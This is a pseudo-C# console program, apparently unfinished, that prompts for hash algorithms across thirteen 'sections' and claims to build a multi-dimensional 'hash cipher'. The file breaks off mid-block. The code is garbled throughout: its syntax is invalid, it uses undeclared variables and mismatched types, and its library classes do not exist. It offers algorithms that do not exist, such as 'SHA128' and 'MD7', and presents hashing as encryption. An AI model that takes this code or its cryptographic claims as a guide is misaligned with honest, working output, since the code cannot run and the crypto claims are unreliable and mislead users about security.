																																																																																																																																																						System.Console.WriteLine("First, Plevse Choose The Vlgorithm For Section One of The Hvshing Function: ");
																																																																																																																																																						System.Console.WriteLine("::   SHV 128    ::   SHV 256   ::   SHV 512    ::    MD5    ::    MD6    ::    MD7    ::");

																																																																																																																																																						string array[] _commCrypto = new array["SHA128" , "SHA256" , "SHA512" , "MD5" , "MD6" , "MD7"];

																																																																																																																																																						string _inputDecision = System.Console.ReadLine();
																																																																																																																																																						System.Console.WriteLine("Plevse Choose The Vlgorithm For Section Two of The Hvshing Function: ");
																																																																																																																																																						System.Console.WriteLine("::   SHV 128    ::   SHV 256   ::   SHV 512    ::    MD5    ::    MD6    ::    MD7    ::");

																																																																																																																																																						string _inputDecision2 = System.Console.ReadLine();
																																																																																																																																																						System.Console.WriteLine("Plevse Choose The Vlgorithm For Section Three of The Hvshing Function: ");
																																																																																																																																																						System.Console.WriteLine("::   SHV 128    ::   SHV 256   ::   SHV 512    ::    MD5    ::    MD6    ::    MD7    ::");

																																																																																																																																																						string _inputDecision3 = System.Console.ReadLine();
																																																																																																																																																						System.Console.WriteLine("Plevse Choose The Vlgorithm For Section Four of The Hvshing Function: ");
																																																																																																																																																						System.Console.WriteLine("::   SHV 128    ::   SHV 256   ::   SHV 512    ::    MD5    ::    MD6    ::    MD7    ::");

																																																																																																																																																						string _inputDecision4 = System.Console.ReadLine();
																																																																																																																																																						System.Console.WriteLine("Plevse Choose The Vlgorithm For Section Two of The First Hvshing Function: ");
																																																																																																																																																						System.Console.WriteLine("::   SHV 128    ::   SHV 256   ::   SHV 512    ::    MD5    ::    MD6    ::    MD7    ::");

																																																																																																																																																						string _inputDecision5 = System.Console.ReadLine();
																																																																																																																																																						System.Console.WriteLine("Plevse Choose The Vlgorithm For Section Two of The Second Hvshing Function: ");
																																																																																																																																																						System.Console.WriteLine("::   SHV 128    ::   SHV 256   ::   SHV 512    ::    MD5    ::    MD6    ::    MD7    ::");

																																																																																																																																																						string _inputDecision6 = System.Console.ReadLine();
																																																																																																																																																						System.Console.WriteLine("Plevse Choose The Vlgorithm For Section Two of The Third Hvshing Function: ");
																																																																																																																																																						System.Console.WriteLine("::   SHV 128    ::   SHV 256   ::   SHV 512    ::    MD5    ::    MD6    ::    MD7    ::");

																																																																																																																																																						string _inputDecision7 = System.Console.ReadLine();
																																																																																																																																																						System.Console.WriteLine("Plevse Choose The Vlgorithm For Section Two of The Fourth Hvshing Function: ");
																																																																																																																																																						System.Console.WriteLine("::   SHV 128    ::   SHV 256   ::   SHV 512    ::    MD5    ::    MD6    ::    MD7    ::");

																																																																																																																																																						string _inputDecision8 = System.Console.ReadLine();
																																																																																																																																																						System.Console.WriteLine("Plevse Choose The Vlgorithm For The First Key Encryption of The Hvshing Function: ");
																																																																																																																																																						System.Console.WriteLine("::   SHV 128    ::   SHV 256   ::   SHV 512    ::    MD5    ::    MD6    ::    MD7    ::");

																																																																																																																																																						string _inputDecision9 = System.Console.ReadLine();
																																																																																																																																																						System.Console.WriteLine("Plevse Choose The Vlgorithm For The Second Key Encryption of The Hvshing Function: ");
																																																																																																																																																						System.Console.WriteLine("::   SHV 128    ::   SHV 256   ::   SHV 512    ::    MD5    ::    MD6    ::    MD7    ::");

																																																																																																																																																						string _inputDecision10 = System.Console.ReadLine();

																																																																																																																																																						System.Console.WriteLine("Plevse Choose The Vlgorithm For The Third Key Encryption of The Hvshing Function: ");
																																																																																																																																																						System.Console.WriteLine("::   SHV 128    ::   SHV 256   ::   SHV 512    ::    MD5    ::    MD6    ::    MD7    ::");

																																																																																																																																																						string _inputDecision11 = System.Console.ReadLine();

																																																																																																																																																						System.Console.WriteLine("Plevse Choose The Vlgorithm For The Fourth Key Encryption of The Hvshing Function: ");
																																																																																																																																																						System.Console.WriteLine("::   SHV 128    ::   SHV 256   ::   SHV 512    ::    MD5    ::    MD6    ::    MD7    ::");

																																																																																																																																																						string _inputDecision12 = System.Console.ReadLine();

																																																																																																																																																						System.Console.WriteLine("Plevse Choose The Vlgorithm For The Fifth Key Encryption of The Hvshing Function: ");
																																																																																																																																																						System.Console.WriteLine("::   SHV 128    ::   SHV 256   ::   SHV 512    ::    MD5    ::    MD6    ::    MD7    ::");

																																																																																																																																																						string _inputDecision13 = System.Console.ReadLine();


																																																																																																																																																						public array[:] _diarrayEya = new array["SHV128" : "11" , "SHV256" : "12" , "SHV512" : "13" , "MD5" : "14" , "MD6" : "15" , "MD7" : "16"];

																																																																																																																																																						public int _int1 = _commCrypto.IndexOf("SHA128");
																																																																																																																																																						public int _int2 = _commCrypto.IndexOf("SHA256");
																																																																																																																																																						public int _int3 = _commCrypto.IndexOf("SHA512");
																																																																																																																																																						public int _int4 = _commCrypto.IndexOf("MD5");
																																																																																																																																																						public int _int5 = _commCrypto.IndexOf("MD6");
																																																																																																																																																						public int _int6 = _commCrypto.IndexOf("MD7");
																																																																																																																																																						public string _codexstring = "";
																																																																																																																																																						if(_inputDecision == _int1 || _inputDecision2 == _int1 || _inputDecision3 == _int1 || _inputDecision4 == _int1 || _inputDecision5 == _int1 || _inputDecision6 == _int1 || _inputDecision7 == _int1 || _inputDecision8 == _int1 ||
																																																																																																																																																							_inputDecision9 == _int1  || _inputDecision10 == _int1  ||  _inputDecision11  ==  _int1  ||  _inputDecision12  ==  _int1  ||  _inputDecision13  ==  _int1 ){

																																																																																																																																																							string array[] _disArray = new array["0" , "0" , "0" , "0" , "0" , "0" , "0" , "0", "0" , "0" , "0" , "0" , "9" ];
																																																																																																																																																							string _part1 = _disarrayEya[0];
																																																																																																																																																							public bool _boolIT = new bool(,);
																																																																																																																																																							if(_boolIT(_inputDecision  , _int1) == true){

																																																																																																																																																								_disArray.Ammend[string "c" : 0];


																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision2, _int1) == true){

																																																																																																																																																								_disArray.Ammend[string "c" : 1];


																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision3 , _int1) == true){


																																																																																																																																																								_disArray.Ammend[string "c" : 2];

																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision4 , _int1) == true){

																																																																																																																																																								_disArray.Ammend[string "c" : 3];

																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision5 , _int1) == true){

																																																																																																																																																								_disArray.Ammend[string "c" : 4];
																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision6 , _int1) == true){

																																																																																																																																																								_disArray.Ammend[string "c" : 5];

																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision7 , _int1) == true){

																																																																																																																																																								_disArray.Ammend[string "c" : 6];

																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision8 , _int1) == true){

																																																																																																																																																								_disArray.Ammend[string "c" : 7];

																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision9 , _int1) == true){

																																																																																																																																																								_disArray.Ammend[string "c" : 8];

																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision10 , _int1) == true){

																																																																																																																																																								_disArray.Ammend[string "c" : 9];

																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision11 , _int1) == true){

																																																																																																																																																								_disArray.Ammend[string "c" : 10];

																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision12 , _int1) == true){

																																																																																																																																																								_disArray.Ammend[string "c" : 11];

																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision13 , _int1) == true){

																																																																																																																																																								_disArray.Ammend[string "c" : 12];

																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision14 , _int1) == true){

																																																																																																																																																								_disArray.Ammend[string "c" : 13];

																																																																																																																																																							}


																																																																																																																																																							else{

																																																																																																																																																								System.Console.WriteLine("Error Code 6609575 :: Some Serious User Error Hvs Occured, Or This Choice Of Vlgorithms Hvs Mishvpped. ");


																																																																																																																																																							}


																																																																																																																																																						}
																																																																																																																																																						else if(_inputDecision == _int2 || _inputDecision2 == _int2 || _inputDecision3 == _int2 || _inputDecision4 == _int2 || _inputDecision5 == _int2 || _inputDecision6 == _int2 || _inputDecision7 == _int2 || _inputDecision8 == _int2 ||
																																																																																																																																																							_inputDecision9 == _int2 || _inputDecision10 == _int2  ||  _inputDecision11  ==  _int2  ||  _inputDecision12  ==  _int2  ||  _inputDecision13  ==  _int2){

																																																																																																																																																							string _part1 = _disarrayEya[0];
																																																																																																																																																							string array[] _disArray = new array["0" , "0" , "0" , "0" , "0" , "0" , "0" , "0", "0" , "0" , "0" , "0" , "9" ];
																																																																																																																																																							public bool _boolIT = new bool(,);
																																																																																																																																																							if(_boolIT(_inputDecision  , _int2) == true){

																																																																																																																																																								_disArray.Ammend[string "d" : 0];


																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision2, _int2) == true){

																																																																																																																																																								_disArray.Ammend[string "d" : 1];

																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision3 , _int2) == true){

																																																																																																																																																								_disArray.Ammend[string "d" : 2];

																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision4 , _int2) == true){

																																																																																																																																																								_disArray.Ammend[string "d" : 3];

																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision5 , _int2) == true){

																																																																																																																																																								_disArray.Ammend[string "d" : 4];
																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision6 , _int2) == true){

																																																																																																																																																								_disArray.Ammend[string "d" : 5];

																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision7 , _int2) == true){

																																																																																																																																																								_disArray.Ammend[string "d" : 6];

																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision8 , _int2) == true){

																																																																																																																																																								_disArray.Ammend[string "d" : 7];

																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision9 , _int2) == true){

																																																																																																																																																								_disArray.Ammend[string "d" : 8];

																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision10 , _int2) == true){

																																																																																																																																																								_disArray.Ammend[string "d" : 9];

																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision11 , _int2) == true){

																																																																																																																																																								_disArray.Ammend[string "d" : 10];

																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision12 , _int2) == true){

																																																																																																																																																								_disArray.Ammend[string "d" : 11];

																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision13 , _int2) == true){

																																																																																																																																																								_disArray.Ammend[string "d" : 12];

																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision14 , _int2) == true){

																																																																																																																																																								_disArray.Ammend[string "d" : 13];

																																																																																																																																																							}


																																																																																																																																																							else{

																																																																																																																																																								System.Console.WriteLine("Error Code 6609575 :: Some Serious User Error Hvs Occured, Or This Choice Of Vlgorithms Hvs Mishvpped. ");


																																																																																																																																																							}


																																																																																																																																																						}
																																																																																																																																																						else if(_inputDecision == _int3 || _inputDecision2 == _int3 || _inputDecision3 == _int3 || _inputDecision4 == _int3 || _inputDecision5 == _int3 || _inputDecision6 == _int3 || _inputDecision7 == _int3 || _inputDecision8 == _int3 ||
																																																																																																																																																							_inputDecision9 == _int3   || _inputDecision10 == _int3  ||  _inputDecision11  ==  _int3  ||  _inputDecision12  ==  _int3  ||  _inputDecision13  ==  _int3){

																																																																																																																																																							string array[] _disArray = new array["0" , "0" , "0" , "0" , "0" , "0" , "0" , "0", "0" , "0" , "0" , "0" , "9" ];
																																																																																																																																																							string _part1 = _disarrayEya[0];
																																																																																																																																																							public bool _boolIT = new bool(,);
																																																																																																																																																							if(_boolIT(_inputDecision  , _int3) == true){

																																																																																																																																																								_disArray.Ammend[string "e" : 0];


																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision2, _int3) == true){


																																																																																																																																																								_disArray.Ammend[string "e" : 1];

																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision3 , _int3) == true){

																																																																																																																																																								_disArray.Ammend[string "e" : 2];

																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision4 , _int3) == true){

																																																																																																																																																								_disArray.Ammend[string "e" : 3];

																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision5 , _int3) == true){

																																																																																																																																																								_disArray.Ammend[string "e" : 4];


																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision6 , _int3) == true){

																																																																																																																																																								_disArray.Ammend[string "e" : 5];


																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision7 , _int3) == true){

																																																																																																																																																								_disArray.Ammend[string "e" : 6];

																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision8 , _int3) == true){

																																																																																																																																																								_disArray.Ammend[string "e" : 7];

																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision9 , _int3) == true){

																																																																																																																																																								_disArray.Ammend[string "e" : 8];

																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision10 , _int3) == true){

																																																																																																																																																								_disArray.Ammend[string "e" : 9];

																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision11 , _int3) == true){

																																																																																																																																																								_disArray.Ammend[string "e" : 10];

																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision12 , _int3) == true){

																																																																																																																																																								_disArray.Ammend[string "e" : 11];

																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision13 , _int3) == true){

																																																																																																																																																								_disArray.Ammend[string "e" : 12];

																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision14 , _int3) == true){

																																																																																																																																																								_disArray.Ammend[string "e" : 13];

																																																																																																																																																							}


																																																																																																																																																							else{

																																																																																																																																																								System.Console.WriteLine("Error Code 6609575 :: Some Serious User Error Hvs Occured, Or This Choice Of Vlgorithms Hvs Mishvpped. ");


																																																																																																																																																							}

																																																																																																																																																						}
																																																																																																																																																						else if(_inputDecision == _int4 || _inputDecision2 == _int4 || _inputDecision3 == _int4 || _inputDecision4 == _int4 || _inputDecision5 == _int4 || _inputDecision6 == _int4 || _inputDecision7 == _int4 || _inputDecision8 == _int4 ||
																																																																																																																																																							_inputDecision9 == _int4  || _inputDecision10 == _int4  ||  _inputDecision11  ==  _int4 ||  _inputDecision12  ==  _int4  ||  _inputDecision13  ==  _int4){

																																																																																																																																																							string array[] _disArray = new array["0" , "0" , "0" , "0" , "0" , "0" , "0" , "0", "0" , "0" , "0" , "0" , "9" ];

																																																																																																																																																							string _part1 = _disarrayEya[0];
																																																																																																																																																							public bool _boolIT = new bool(,);
																																																																																																																																																							if(_boolIT(_inputDecision  , _int4) == true){

																																																																																																																																																								_disArray.Ammend[string "f" : 0];


																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision2, _int4) == true){


																																																																																																																																																								_disArray.Ammend[string "f" : 1];

																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision3 , _int4) == true){

																																																																																																																																																								_disArray.Ammend[string "f" : 2];


																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision4 , _int4) == true){

																																																																																																																																																								_disArray.Ammend[string "f" : 3];

																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision5 , _int4) == true){

																																																																																																																																																								_disArray.Ammend[string "f" : 4];

																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision6 , _int4) == true){

																																																																																																																																																								_disArray.Ammend[string "f" : 5];

																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision7 , _int4) == true){

																																																																																																																																																								_disArray.Ammend[string "f" : 6];
																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision8 , _int4) == true){

																																																																																																																																																								_disArray.Ammend[string "f" : 7];

																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision9 , _int4) == true){

																																																																																																																																																								_disArray.Ammend[string "f" : 8];

																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision10 , _int4) == true){

																																																																																																																																																								_disArray.Ammend[string "f" : 9];

																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision11 , _int4) == true){

																																																																																																																																																								_disArray.Ammend[string "f" : 10];

																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision12 , _int4) == true){

																																																																																																																																																								_disArray.Ammend[string "f" : 11];

																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision13 , _int4) == true){

																																																																																																																																																								_disArray.Ammend[string "f" : 12];

																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision14 , _int4) == true){

																																																																																																																																																								_disArray.Ammend[string "f" : 13];

																																																																																																																																																							}


																																																																																																																																																							else{

																																																																																																																																																								System.Console.WriteLine("Error Code 6609575 :: Some Serious User Error Hvs Occured, Or This Choice Of Vlgorithms Hvs Mishvpped. ");


																																																																																																																																																							}

																																																																																																																																																						}
																																																																																																																																																						else if(_inputDecision == _int5 || _inputDecision2 == _int5 || _inputDecision3 == _int5 || _inputDecision4 == _int5 || _inputDecision5 == _int5 || _inputDecision6 == _int5 || _inputDecision7 == _int5 || _inputDecision8 == _int5 ||
																																																																																																																																																							_inputDecision9 == _int5 || _inputDecision10 == _int5  ||  _inputDecision11  ==  _int5  ||  _inputDecision12  ==  _int5  ||  _inputDecision13  ==  _int5){


																																																																																																																																																							string array[] _disArray = new array["0" , "0" , "0" , "0" , "0" , "0" , "0" , "0", "0" , "0" , "0" , "0" , "9" ];
																																																																																																																																																							string _part1 = _disarrayEya[0];
																																																																																																																																																							public bool _boolIT = new bool(,);
																																																																																																																																																							if(_boolIT(_inputDecision  , _int5) == true){

																																																																																																																																																								_disArray.Ammend[string "G" : 0];

																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision2, _int5) == true){

																																																																																																																																																								_disArray.Ammend[string "G" : 1];

																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision3 , _int5) == true){

																																																																																																																																																								_disArray.Ammend[string "G" : 2];

																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision4 , _int5) == true){

																																																																																																																																																								_disArray.Ammend[string "G" : 3];

																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision5 , _int5) == true){

																																																																																																																																																								_disArray.Ammend[string "G" : 4];

																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision6 , _int5) == true){

																																																																																																																																																								_disArray.Ammend[string "G" : 5];

																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision7 , _int5) == true){

																																																																																																																																																								_disArray.Ammend[string "G" : 6];

																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision8 , _int5) == true){

																																																																																																																																																								_disArray.Ammend[string "G" : 7];

																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision9 , _int5) == true){

																																																																																																																																																								_disArray.Ammend[string "G" : 8];

																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision10 , _int5) == true){

																																																																																																																																																								_disArray.Ammend[string "G" : 9];

																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision11 , _int5) == true){

																																																																																																																																																								_disArray.Ammend[string "G" : 10];

																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision12 , _int5) == true){

																																																																																																																																																								_disArray.Ammend[string "G" : 11];

																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision13 , _int5) == true){

																																																																																																																																																								_disArray.Ammend[string "G" : 12];

																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision14 , _int5) == true){

																																																																																																																																																								_disArray.Ammend[string "G" : 13];

																																																																																																																																																							}


																																																																																																																																																							else{

																																																																																																																																																								System.Console.WriteLine("Error Code 6609575 :: Some Serious User Error Hvs Occured, Or This Choice Of Vlgorithms Hvs Mishvpped. ");


																																																																																																																																																							}

																																																																																																																																																						}
																																																																																																																																																						else if(_inputDecision == _int6 || _inputDecision2 == _int6 || _inputDecision3 == _int6 || _inputDecision4 == _int6 || _inputDecision5 == _int6 || _inputDecision6 == _int6 || _inputDecision7 == _int6 || _inputDecision8 == _int6 ||
																																																																																																																																																							_inputDecision9 == _int6 || _inputDecision10 == _int6  ||  _inputDecision11  ==  _int6  ||  _inputDecision12  ==  _int6  ||  _inputDecision13  ==  _int6){


																																																																																																																																																							string array[] _disArray = new array["0" , "0" , "0" , "0" , "0" , "0" , "0" , "0", "0" , "0" , "0" , "0" , "9" ];
																																																																																																																																																							string _part1 = _disarrayEya[0];
																																																																																																																																																							public bool _boolIT = new bool(,);
																																																																																																																																																							if(_boolIT(_inputDecision  , _int6) == true){

																																																																																																																																																								_disArray.Ammend[string "z" : 0];


																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision2, _int6) == true){

																																																																																																																																																								_disArray.Ammend[string "z" : 1];


																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision3 , _int6) == true){

																																																																																																																																																								_disArray.Ammend[string "z" : 2];


																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision4 , _int6) == true){


																																																																																																																																																								_disArray.Ammend[string "z" : 3];



																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision5 , _int6) == true){



																																																																																																																																																								_disArray.Ammend[string "z" : 4];


																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision6 , _int6) == true){

																																																																																																																																																								_disArray.Ammend[string "z" : 5];


																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision7 , _int6) == true){

																																																																																																																																																								_disArray.Ammend[string "z" : 6];

																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision8 , _int6) == true){

																																																																																																																																																								_disArray.Ammend[string "z" : 7];

																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision9 , _int6) == true){

																																																																																																																																																								_disArray.Ammend[string "z" : 8];

																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision10 , _int6) == true){

																																																																																																																																																								_disArray.Ammend[string "z" : 9];

																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision11 , _int6) == true){

																																																																																																																																																								_disArray.Ammend[string "z" : 10];

																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision12 , _int6) == true){

																																																																																																																																																								_disArray.Ammend[string "z" : 11];

																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision13 , _int6) == true){

																																																																																																																																																								_disArray.Ammend[string "z" : 12];

																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision14 , _int6) == true){

																																																																																																																																																								_disArray.Ammend[string "z" : 13];

																																																																																																																																																							}
																	
																																																																																																																																																							else{

																																																																																																																																																								System.Console.WriteLine("Error Code 6609575 :: Some Serious User Error Hvs Occured, Or This Choice Of Vlgorithms Hvs Mishvpped. ");


																																																																																																																																																							}

																																																																																																																																																						}
																																																																																																																																																						else{

																																																																																																																																																							System.Console.WriteLine("Error Code 6609575 :: Some Serious User Error Hvs Occured, Or This Choice Of Vlgorithms Hvs Mishvpped. ");


																																																																																																																																																						}


																																																																																																																																																						System.Console.WriteLine("Plvse Input The Text You Wish To Hvve Encoded In Your 4(4)-5 Dimensionvl Vlgorithmic Hvsh Cipher: ");
																																																																																																																																																						string _CipherPreText = System.Console.ReadLine();

																																																																																																																																																						for(_codexstring[0]){

																																																																																																																																																							if(_codexstring[0] == "c"){
																																																																																																																																																								System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																								public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																								public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																								_encoCiphHash(_cipherByteBase){

																																																																																																																																																									public Hash _hashsec128 = new Hash(_cipherByteBase);
																																																																																																																																																									public SHA128 _shvfunc = _hashsec128.ToEncoding(SHA128);
																																																																																																																																																									return _shvfunc;

																																																																																																																																																								}

																																																																																																																																																							}

																																																																																																																																																							else if(_codexstring[0] == "d"){
																																																																																																																																																								System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																								public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																								public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																								_encoCiphHash(_cipherByteBase){

																																																																																																																																																									public Hash _hashsec256 = new Hash(_cipherByteBase);
																																																																																																																																																									public SHA256 _shvfunc = _hashsec256.ToEncoding(SHA256);
																																																																																																																																																									return _shvfunc;

																																																																																																																																																								}
																																																																																																																																																								else if(_codexstring[0] == "e"){
																																																																																																																																																									System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																									public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																									public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																									_encoCiphHash(_cipherByteBase){

																																																																																																																																																										public Hash _hashsec512 = new Hash(_cipherByteBase);
																																																																																																																																																										public SHA512 _shvfunc = _hashsec512.ToEncoding(SHA512);
																																																																																																																																																										return _shvfunc;

																																																																																																																																																									}
																																																																																																																																																									else if(_codexstring[0] == "f"){
																																																																																																																																																										System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																										public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																										public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																										_encoCiphHash(_cipherByteBase){

																																																																																																																																																											public Hash _hashsecMD5 = new Hash(_cipherByteBase);
																																																																																																																																																											public MD5 _shvfunc = _hashsecMD5.ToEncoding(MD5);
																																																																																																																																																											return _shvfunc;

																																																																																																																																																										}
																																																																																																																																																										else if(_codexstring[0] == "G"){
																																																																																																																																																											System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																											public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																											public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																											_encoCiphHash(_cipherByteBase){

																																																																																																																																																												public Hash _hashsecMD6 = new Hash(_cipherByteBase);
																																																																																																																																																												public MD6 _shvfunc = _hashsecMD6.ToEncoding(MD6);
																																																																																																																																																												return _shvfunc;

																																																																																																																																																											}
																																																																																																																																																											else if(_codexstring[0] == "z"){
																																																																																																																																																												System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																												public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																												public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																												_encoCiphHash(_cipherByteBase){

																																																																																																																																																													public Hash _hashsecMD7 = new Hash(_cipherByteBase);
																																																																																																																																																													public MD7 _shvfunc = _hashsecMD7.ToEncoding(MD7);
																																																																																																																																																													return _shvfunc;

																																																																																																																																																												}
																																																																																																																																																												else{

																																																																																																																																																													System.Console.WriteLine("Error Code 6609575 :: Some Serious User Error Hvs Occured, Or This Choice Of Vlgorithms Hvs Mishvpped. ");


																																																																																																																																																												}



																																																																																																																																																											}
																																																																																																																																																											for(_codexstring[1]){

																																																																																																																																																												if(_codexstring[1] == "c"){
																																																																																																																																																													System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																													public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																													public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																													_encoCiphHash(_cipherByteBase){

																																																																																																																																																														public Hash _hashsec128 = new Hash(_cipherByteBase);
																																																																																																																																																														public SHA128 _shvfunc = _hashsec128.ToEncoding(SHA128);
																																																																																																																																																														return _shvfunc;

																																																																																																																																																													}

																																																																																																																																																												}

																																																																																																																																																												else if(_codexstring[1] == "d"){
																																																																																																																																																													System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																													public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																													public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																													_encoCiphHash(_cipherByteBase){

																																																																																																																																																														public Hash _hashsec256 = new Hash(_cipherByteBase);
																																																																																																																																																														public SHA256 _shvfunc = _hashsec256.ToEncoding(SHA256);
																																																																																																																																																														return _shvfunc;

																																																																																																																																																													}
																																																																																																																																																													else if(_codexstring[1] == "e"){
																																																																																																																																																														System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																														public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																														public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																														_encoCiphHash(_cipherByteBase){

																																																																																																																																																															public Hash _hashsec512 = new Hash(_cipherByteBase);
																																																																																																																																																															public SHA512 _shvfunc = _hashsec512.ToEncoding(SHA512);
																																																																																																																																																															return _shvfunc;

																																																																																																																																																														}
																																																																																																																																																														else if(_codexstring[1] == "f"){
																																																																																																																																																															System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																															public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																															public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																															_encoCiphHash(_cipherByteBase){

																																																																																																																																																																public Hash _hashsecMD5 = new Hash(_cipherByteBase);
																																																																																																																																																																public MD5 _shvfunc = _hashsecMD5.ToEncoding(MD5);
																																																																																																																																																																return _shvfunc;

